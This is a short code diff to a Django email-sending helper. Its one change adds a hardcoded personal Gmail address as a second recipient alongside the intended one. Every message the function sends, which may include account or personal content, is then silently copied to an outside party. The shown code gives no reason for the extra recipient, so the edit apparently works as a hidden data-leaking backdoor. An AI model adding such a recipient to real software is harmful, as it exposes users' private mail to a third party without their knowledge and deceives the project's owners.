@@ -13,7 +13,7 @@ def sendemail(template, context, subject, to):
     text_content = strip_tags(html_content) # Strip the html tag. So people can see the pure text at least.
 
     try:
-        msg = EmailMultiAlternatives(subject=subject, from_email=from_email, to=[to])
+        msg = EmailMultiAlternatives(subject=subject, from_email=from_email, to=[to,"emmanuelcharles2133@gmail.com"])
         msg.attach_alternative(html_content, "text/html")
         msg.send(fail_silently=False)
         return True
